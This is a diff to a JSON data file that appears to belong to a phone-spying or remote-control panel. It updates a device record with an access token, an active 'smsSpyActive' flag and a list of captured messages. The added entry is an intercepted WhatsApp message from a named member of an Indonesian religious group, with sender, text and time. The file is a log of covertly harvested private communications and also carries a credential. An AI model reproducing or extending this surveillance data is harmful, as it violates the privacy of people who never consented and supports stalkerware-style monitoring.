@@ -2181,7 +2181,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777769043106,
+    "lastSeen": 1777769058123,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
@@ -2197,6 +2197,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎PP AZKHAL MUSTOFA CIKUDA (6 pesan): ~ MUSTOFA ARAFAT",
+        "content": "As wr wb\nSupaya grup ini lebih bermanfaat, selain ajang saling silaturahmi boleh kita saling bertanya dan menjawab tentang ilmu baik fiqih,tasawuf dls..\nMonggo dan sertakan referensi ya",
+        "time": "03/05 07:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777769060250
+      },
       {
         "appName": "WhatsApp",
         "sender": "PP AZKHAL MUSTOFA CIKUDA",
